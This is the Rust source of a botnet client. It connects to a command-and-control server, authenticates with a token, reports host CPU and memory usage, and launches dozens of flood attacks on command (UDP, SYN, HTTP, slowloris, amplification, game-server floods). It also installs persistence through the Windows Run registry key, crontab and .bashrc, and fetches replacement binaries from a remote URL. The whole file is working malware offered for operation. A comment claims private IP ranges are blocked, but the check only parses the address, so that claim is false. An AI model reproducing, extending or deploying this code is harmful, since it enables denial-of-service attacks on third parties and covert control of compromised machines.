mod attack_methods;
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::{sleep, Duration, timeout};
use tokio::sync::Semaphore;
use anyhow::Result;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Instant;
use std::collections::HashMap;
use tokio::sync::Mutex;
use tokio_rustls::rustls;
use tokio_rustls::TlsConnector;
use sysinfo::System;
const RECONNECT_DELAY: Duration = Duration::from_secs(5);
const READ_TIMEOUT: Duration = Duration::from_secs(60);
const MAX_CONCURRENT_ATTACKS: usize = 5;
use sha2::{Sha256, Digest};
use hex;

#[derive(Debug)]
struct PinnedCertificateVerifier {
    pinned_hash: String,
}

impl PinnedCertificateVerifier {
    fn new(hash: String) -> Self {
        Self { pinned_hash: hash }
    }
}

impl rustls::client::danger::ServerCertVerifier for PinnedCertificateVerifier {
    fn verify_server_cert(
        &self,
        end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        let mut hasher = Sha256::new();
        hasher.update(end_entity.as_ref());
        let hash = hex::encode(hasher.finalize());
        
        if hash == self.pinned_hash {
            Ok(rustls::client::danger::ServerCertVerified::assertion())
        } else {
            if self.pinned_hash.is_empty() {
                 // Fallback for initial setup ONLY - WARN LOUDLY
                 tracing::error!("CRITICAL SECURITY WARNING: Certificate pinning is DISABLED! Man-in-the-Middle attacks are possible.");
                 return Ok(rustls::client::danger::ServerCertVerified::assertion());
            }
            
            tracing::error!("Certificate pinning failed! Expected {}, got {}", self.pinned_hash, hash);
            Err(rustls::Error::General(format!("Certificate pinning failed! Expected {}, got {}", self.pinned_hash, hash)))
        }
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        rustls::crypto::ring::default_provider().signature_verification_algorithms.supported_schemes()
    }
}

struct BotState {
    active_attacks: Mutex<usize>,
    attack_handles: Mutex<HashMap<usize, (tokio::task::JoinHandle<()>, Arc<AtomicBool>)>>,
    attack_semaphore: Arc<Semaphore>,
}

fn is_valid_target_ip(ip: &str) -> bool {
    ip.parse::<std::net::IpAddr>().is_ok()
}

async fn connect_and_run(state: Arc<BotState>) -> Result<()> {
    // C2 Address is now injected at build time for security
    let c2_address = env!("C2_ADDRESS");
    let stream = TcpStream::connect(c2_address).await?;
    stream.set_nodelay(true)?; 
    tracing::info!("[OK] Connected to C2 server at {}", c2_address);

    // In a real production build, this hash should be embedded at compile time.
    // For this implementation, we'll look for an env var or file, or default to empty (dev mode).
    let pinned_hash = std::env::var("PINNED_CERT_HASH").unwrap_or_default();
    
    let config = rustls::ClientConfig::builder_with_provider(Arc::new(rustls::crypto::ring::default_provider()))
        .with_safe_default_protocol_versions()?
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(PinnedCertificateVerifier::new(pinned_hash)))
        .with_no_client_auth();
        
    let connector = TlsConnector::from(Arc::new(config));
    let domain = rustls::pki_types::ServerName::try_from("localhost")
        .map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidInput, "invalid dns name"))?;
    let mut conn = connector.connect(domain, stream).await?;
    // Bot Token is now injected at build time
    let bot_token = env!("BOT_TOKEN");
    
    if bot_token == "default_token_placeholder" {
        tracing::error!("Bot token not configured! Please set bot_token.txt before building.");
        return Err(anyhow::anyhow!("Bot token not configured"));
    }

    let version = "2.0";
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or(Duration::ZERO)
        .as_secs();
    let auth_msg = format!("AUTH {} {} {}\n", bot_token, version, timestamp);
    conn.write_all(auth_msg.as_bytes()).await?;
    let mut auth_response = vec![0u8; 64];
    let n = conn.read(&mut auth_response).await?;
    let response = String::from_utf8_lossy(&auth_response[..n]);
    if !response.contains("AUTH_OK") {
        tracing::error!("Authentication failed: {}", response);
        return Err(anyhow::anyhow!("Bot authentication failed"));
    }
    tracing::info!("[OK] Authenticated with C2 server");
    let (reader, writer) = tokio::io::split(conn);
    let reader = Arc::new(tokio::sync::Mutex::new(reader));
    let writer = Arc::new(tokio::sync::Mutex::new(writer));
    let writer_status = writer.clone();
    let status_task = tokio::spawn(async move {
        let mut sys = System::new();
        let mut interval = tokio::time::interval(Duration::from_secs(10));
        loop {
            interval.tick().await;
            sys.refresh_cpu();
            sys.refresh_memory();
            let cpu = sys.global_cpu_info().cpu_usage();
            let mem = if sys.total_memory() > 0 {
                (sys.used_memory() as f32 / sys.total_memory() as f32) * 100.0
            } else {
                0.0
            };
            let status_msg = format!("STATUS {:.1} {:.1}\n", cpu, mem);
            let mut w = writer_status.lock().await;
            if w.write_all(status_msg.as_bytes()).await.is_err() {
                break;
            }
        }
    });
    loop {
        let mut line = String::new();
        let mut buf = [0u8; 1];
        let read_result = timeout(READ_TIMEOUT, async {
            let mut r = reader.lock().await;
            loop {
                match r.read(&mut buf).await {
                    Ok(0) => return Ok::<usize, std::io::Error>(0),
                    Ok(_) => {
                        let ch = buf[0] as char;
                        if ch == '\n' {
                            break;
                        }
                        if ch != '\r' {
                            line.push(ch);
                        }
                    }
                    Err(e) => return Err(e),
                }
            }
            Ok(line.len())
        }).await;
        match read_result {
            Ok(Ok(bytes_read)) => {
                if bytes_read == 0 {
                    tracing::info!("Connection closed by server");
                    break;
                }
                let command = line.trim();
                if !command.is_empty() {
                    if command == "PING" {
                        tracing::debug!("Received PING");
                        let mut w = writer.lock().await;
                        if let Err(e) = w.write_all(b"PONG\n").await {
                             tracing::error!("Failed to send PONG: {}", e);
                             break;
                        }
                    } else {
                        if let Err(e) = handle_command(command, state.clone()).await {
                            tracing::error!("Failed to handle command '{}': {}", command, e);
                        }
                    }
                }
            }
            Ok(Err(e)) => {
                tracing::error!("Read error: {}", e);
                break;
            }
            Err(_) => {
                tracing::warn!("Read timeout - connection may be dead");
                break;
            }
        }
    }
    status_task.abort();
    Ok(())
}
async fn handle_command(command: &str, state: Arc<BotState>) -> Result<()> {
    let fields: Vec<&str> = command.split_whitespace().collect();
    if fields.is_empty() {
        return Ok(());
    }
    let cmd = fields[0];
    match cmd {
        "!udpflood" | "!udpsmart" | "!tcpflood" | "!synflood" | 
        "!ackflood" | "!rstflood" | "!finflood" | "!greflood" | "!dns" | "!dnsl4" | "!http" |
        "!slowloris" | "!sslflood" | "!websocket" | "!icmpflood" |
        "!amplification" | "!connection" |
        "!vse" | "!ovh" | "!ua" | "!stress" |
        "!minecraft" | "!raknet" | "!fivem" | "!ts3" | "!udpmax" |
        "!discord" | "!sip" => {
            handle_attack_command(cmd, &fields, state).await?;
        }
        "STOP" => {
            if fields.len() >= 2 {
                if let Ok(attack_id) = fields[1].parse::<usize>() {
                    tracing::info!("Received STOP command for attack {}", attack_id);
                    let mut handles = state.attack_handles.lock().await;
                    if let Some((handle, stop_signal)) = handles.remove(&attack_id) {
                        stop_signal.store(true, Ordering::Relaxed);
                        handle.abort();
                        tracing::info!("Attack {} task cancelled", attack_id);
                    } else {
                        tracing::warn!("Attack {} not found or already completed", attack_id);
                    }
                } else {
                    tracing::warn!("Invalid attack ID in STOP command: {}", fields[1]);
                }
            }
        }
        "!kill" => {
            tracing::warn!("Received kill command - shutting down");
            std::process::exit(0);
        }
        "!lock" => {
            tracing::info!("Lock command received");
            // Simple lock implementation: Create a lock file that prevents other instances or actions
            if let Ok(mut file) = std::fs::File::create("bot.lock") {
                use std::io::Write;
                let _ = file.write_all(b"LOCKED");
                tracing::info!("Bot locked via lockfile");
            }
        }
        "!persist" => {
            tracing::info!("Persist command received");
            #[cfg(target_os = "windows")]
            {
                use winreg::enums::*;
                use winreg::RegKey;
                if let Ok(exe_path) = std::env::current_exe() {
                    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
                    let path = std::path::Path::new("Software").join("Microsoft").join("Windows").join("CurrentVersion").join("Run");
                    if let Ok((key, _)) = hkcu.create_subkey(&path) {
                        let _ = key.set_value("RustNetBot", &exe_path.to_string_lossy().as_ref());
                        tracing::info!("Persistence installed to Registry Run key");
                    }
                }
            }
            #[cfg(target_os = "linux")]
            {
                // Simple cron persistence
                if let Ok(exe_path) = std::env::current_exe() {
                    let cron_entry = format!("@reboot {}\n", exe_path.to_string_lossy());
                    use std::process::{Command, Stdio};
                    use std::io::Write;
                    
                    // Try to read existing crontab first
                    let output = Command::new("crontab").arg("-l").output();
                    let mut current_cron = String::new();
                    if let Ok(out) = output {
                        current_cron = String::from_utf8_lossy(&out.stdout).to_string();
                    }

                    if !current_cron.contains(&exe_path.to_string_lossy().to_string()) {
                        let mut child = Command::new("crontab")
                            .arg("-")
                            .stdin(Stdio::piped())
                            .spawn();
                            
                        if let Ok(mut child) = child {
                            if let Some(mut stdin) = child.stdin.take() {
                                let _ = stdin.write_all(current_cron.as_bytes());
                                let _ = stdin.write_all(cron_entry.as_bytes());
                            }
                            let _ = child.wait();
                            tracing::info!("Persistence added to crontab");
                        }
                    }
                    
                    // Fallback to .bashrc
                    if let Ok(home) = std::env::var("HOME") {
                        let bashrc = std::path::Path::new(&home).join(".bashrc");
                        use std::io::Write;
                        if let Ok(mut file) = std::fs::OpenOptions::new().append(true).open(bashrc) {
                            let _ = writeln!(file, "({} &) >/dev/null 2>&1", exe_path.to_string_lossy());
                            tracing::info!("Persistence added to .bashrc");
                        }
                    }
                }
            }
        }
        "!update" => {
            if fields.len() >= 3 {
                let url = fields[1];
                let checksum = fields[2].to_string();
                
                if !url.starts_with("https://") {
                    tracing::error!("Update failed: HTTPS required for security");
                    return Ok(());
                }

                tracing::info!("Update command received. URL: {}", url);
                
                // Spawn update task
                let url = url.to_string();
                tokio::spawn(async move {
                    if let Err(e) = perform_update(&url, checksum).await {
                        tracing::error!("Update failed: {}", e);
                    } else {
                        tracing::info!("Update successful - restarting...");
                        std::process::exit(0); // Service manager/cron will restart it
                    }
                });
            } else {
                tracing::error!("Update failed: Missing URL or Checksum (Usage: !update <url> <checksum>)");
            }
        }
        "ATTACK" => {
            handle_v2_attack_command(&fields, state).await?;
        }
        "PING" => {
            // Server sends PING to check liveness. 
            // We can optionally respond with PONG, but the server also accepts STATUS updates as heartbeat.
            // We'll log it for debug purposes.
            tracing::debug!("Received PING from server");
        }
        _ => {
            tracing::warn!("Unknown command: {}", cmd);
        }
    }
    Ok(())
}
async fn handle_v2_attack_command(fields: &[&str], state: Arc<BotState>) -> Result<()> {
    if fields.len() != 6 {
        return Err(anyhow::anyhow!("Invalid ATTACK command format"));
    }
    let attack_id = fields[1].parse::<usize>()?;
    let method = fields[2].to_uppercase();
    let target = fields[3].to_string();
    let port = fields[4].parse::<u16>()?;
    let duration = fields[5].parse::<u64>()?;
    if !is_valid_target_ip(&target) {
        tracing::warn!("Rejected attack on invalid/private IP: {}", target);
        return Err(anyhow::anyhow!("Target IP is invalid or in blocked range"));
    }
    if duration == 0 || duration > 3600 {
        return Err(anyhow::anyhow!("Invalid duration"));
    }
    let permit = match state.attack_semaphore.clone().try_acquire_owned() {
        Ok(p) => p,
        Err(_) => {
            tracing::warn!("Attack limit reached - dropping attack command");
            return Ok(());
        }
    };
    {
        let mut active = state.active_attacks.lock().await;
        *active += 1;
        tracing::info!("Starting V2 attack: {} {}:{} for {}s ({} active)", method, target, port, duration, *active);
    }
    let state_clone = state.clone();
    let method_clone = method.clone();
    let stop_signal = Arc::new(AtomicBool::new(false));
    let stop_signal_clone = stop_signal.clone();

    let handle = tokio::spawn(async move {
        let start = Instant::now();
        let result: Result<(), Box<dyn std::error::Error + Send + Sync>> = match method_clone.as_str() {
            "UDP" | "STD" => { attack_methods::udp_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "TCP" => { attack_methods::tcp_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "SYN" => { attack_methods::tcp_connect_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "ACK" => { attack_methods::ack_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "RST" => { attack_methods::rst_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "FIN" => { attack_methods::fin_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "VSE" => { attack_methods::vse_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "OVH" | "NFO" | "BYPASS" => { attack_methods::ovh_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "HTTP" => { attack_methods::http_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "UA" | "UA-HTTP" => { attack_methods::ua_bypass_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "SLOWLORIS" => { attack_methods::slowloris(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "STRESS" => { attack_methods::http_stress(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "MINECRAFT" => { attack_methods::minecraft_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "RAKNET" => { attack_methods::raknet_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "FIVEM" => { attack_methods::fivem_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "TS3" => { attack_methods::ts3_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "DISCORD" => { attack_methods::discord_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "SIP" => { attack_methods::sip_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "TLS" | "SSL" => { attack_methods::ssl_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "DNS" => { attack_methods::dns_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "DNSL4" => { attack_methods::dns_flood_l4(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "UDPMAX" => { attack_methods::udp_max_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "UDPSMART" => { attack_methods::udp_smart(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "ICMP" => { attack_methods::icmp_flood(&target, duration, stop_signal_clone).await; Ok(()) },
            "GRE" => { attack_methods::gre_flood(&target, duration, stop_signal_clone).await; Ok(()) },
            "AMPLIFICATION" | "AMP" => { attack_methods::amplification_attack(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "CONNECTION" | "TCPCONN" => { attack_methods::tcp_connect_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            "WEBSOCKET" | "WS" => { attack_methods::websocket_flood(&target, port, duration, stop_signal_clone).await; Ok(()) },
            _ => {
                tracing::warn!("Unknown V2 attack method: {}", method_clone);
                Ok(())
            }
        };
        let elapsed = start.elapsed().as_secs();
        if let Err(e) = result {
            tracing::error!("Attack {} failed: {}", method_clone, e);
        } else {
            tracing::info!("Attack {} completed after {}s", method_clone, elapsed);
        }
        {
            let mut active = state_clone.active_attacks.lock().await;
            *active = active.saturating_sub(1);
        }
        state_clone.attack_handles.lock().await.remove(&attack_id);
        drop(permit);
    });
    state.attack_handles.lock().await.insert(attack_id, (handle, stop_signal));
    Ok(())
}
async fn handle_attack_command(cmd: &str, fields: &[&str], state: Arc<BotState>) -> Result<()> {
    let (target, port, duration, attack_id) = if cmd == "!greflood" {
        if fields.len() != 4 { 
            return Err(anyhow::anyhow!("Invalid command format for {} - expected: !greflood <ip> <duration> <attack_id>", cmd));
        }
        let target = fields[1].to_string();
        let duration = fields[2].parse::<u64>()?;
        let attack_id = fields[3].parse::<usize>()?;
        (target, 0u16, duration, attack_id)
    } else {
        if fields.len() != 5 {  
            return Err(anyhow::anyhow!("Invalid command format for {} - expected: {} <ip> <port> <duration> <attack_id>", cmd, cmd));
        }
        let target = fields[1].to_string();
        let port = fields[2].parse::<u16>()?;
        let duration = fields[3].parse::<u64>()?;
        let attack_id = fields[4].parse::<usize>()?;
        (target, port, duration, attack_id)
    };
    if !is_valid_target_ip(&target) {
        tracing::warn!("Rejected attack on invalid/private IP: {}", target);
        return Err(anyhow::anyhow!("Target IP is invalid or in blocked range"));
    }
    if duration == 0 || duration > 3600 {
        tracing::warn!("Rejected attack with invalid duration: {}s", duration);
        return Err(anyhow::anyhow!("Invalid duration: must be 1-3600 seconds"));
    }
    let permit = state.attack_semaphore.clone().try_acquire_owned();
    if permit.is_err() {
        tracing::warn!("Attack limit reached - dropping attack command");
        return Ok(());
    }
    let permit = match permit {
        Ok(p) => p,
        Err(_) => {
            tracing::warn!("Failed to acquire attack permit");
            return Ok(());
        }
    };
    {
        let mut active = state.active_attacks.lock().await;
        *active += 1;
        tracing::info!("Starting attack: {} {}:{} for {}s ({} active)", cmd, target, port, duration, *active);
    }
    let state_clone = state.clone();
    let cmd_owned = cmd.to_string(); 
    let stop_signal = Arc::new(AtomicBool::new(false));
    let stop_signal_clone = stop_signal.clone();

    let handle = tokio::spawn(async move {
        let start = Instant::now();
        let cmd = cmd_owned.as_str(); 
        let result: Result<(), Box<dyn std::error::Error + Send + Sync>> = match cmd {
            "!udpflood" => {
                attack_methods::udp_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!udpsmart" => {
                attack_methods::udp_smart(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!udpmax" => {
                attack_methods::udp_max_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!tcpflood" => {
                attack_methods::tcp_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!synflood" => {
                attack_methods::syn_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!ackflood" => {
                attack_methods::ack_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!rstflood" => {
                attack_methods::rst_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!finflood" => {
                attack_methods::fin_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!greflood" => {
                attack_methods::gre_flood(&target, duration, stop_signal_clone).await;
                Ok(())
            }
            "!dns" => {
                attack_methods::dns_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!dnsl4" => {
                attack_methods::dns_flood_l4(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!http" => {
                attack_methods::http_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!slowloris" => {
                attack_methods::slowloris(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!sslflood" => {
                attack_methods::ssl_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!websocket" => {
                attack_methods::websocket_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!icmpflood" => {
                attack_methods::icmp_flood(&target, duration, stop_signal_clone).await;
                Ok(())
            }
            "!amplification" => {
                attack_methods::amplification_attack(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!connection" => {
                attack_methods::connection_exhaustion(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!vse" => {
                attack_methods::vse_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!ovh" => {
                attack_methods::ovh_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!ua" => {
                attack_methods::ua_bypass_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!stress" => {
                attack_methods::http_stress(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!minecraft" => {
                attack_methods::minecraft_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!raknet" => {
                attack_methods::raknet_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!fivem" => {
                attack_methods::fivem_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!ts3" => {
                attack_methods::ts3_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!discord" => {
                attack_methods::discord_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            "!sip" => {
                attack_methods::sip_flood(&target, port, duration, stop_signal_clone).await;
                Ok(())
            }
            _ => {
                tracing::warn!("Unknown attack command: {}", cmd);
                Ok(())
            }
        };
        let elapsed = start.elapsed().as_secs();
        if let Err(e) = result {
            tracing::error!("Attack {} failed: {}", cmd, e);
        } else {
            tracing::info!("Attack {} completed after {}s", cmd, elapsed);
        }
        {
            let mut active = state_clone.active_attacks.lock().await;
            *active = active.saturating_sub(1);
        }
        state_clone.attack_handles.lock().await.remove(&attack_id);
        drop(permit); 
    });
    state.attack_handles.lock().await.insert(attack_id, (handle, stop_signal));
    Ok(())
}
async fn perform_update(url: &str, expected_checksum: String) -> Result<()> {
    let response = reqwest::get(url).await?;
    let bytes = response.bytes().await?;
    
    let mut hasher = Sha256::new();
    hasher.update(&bytes);
    let hash = hex::encode(hasher.finalize());
    if hash != expected_checksum {
        return Err(anyhow::anyhow!("Checksum mismatch! Expected {}, got {}", expected_checksum, hash));
    }

    let current_exe = std::env::current_exe()?;
    let tmp_path = current_exe.with_extension("tmp");
    
    tokio::fs::write(&tmp_path, bytes).await?;
    
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = tokio::fs::metadata(&tmp_path).await?.permissions();
        perms.set_mode(0o755);
        tokio::fs::set_permissions(&tmp_path, perms).await?;
    }

    // Rename current to .bak (Windows requirement, good practice on Linux too)
    let bak_path = current_exe.with_extension("bak");
    if bak_path.exists() {
        let _ = tokio::fs::remove_file(&bak_path).await;
    }
    
    // On Linux we can just rename over. On Windows we must move the running exe first.
    tokio::fs::rename(&current_exe, &bak_path).await?;
    tokio::fs::rename(&tmp_path, &current_exe).await?;
    
    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt::init();
    
    let state = Arc::new(BotState {
        active_attacks: Mutex::new(0),
        attack_handles: Mutex::new(HashMap::new()),
        attack_semaphore: Arc::new(Semaphore::new(MAX_CONCURRENT_ATTACKS)),
    });

    loop {
        if let Err(e) = connect_and_run(state.clone()).await {
            tracing::error!("Connection error: {}", e);
        }
        tracing::info!("Reconnecting in {}s...", RECONNECT_DELAY.as_secs());
        sleep(RECONNECT_DELAY).await;
    }
}
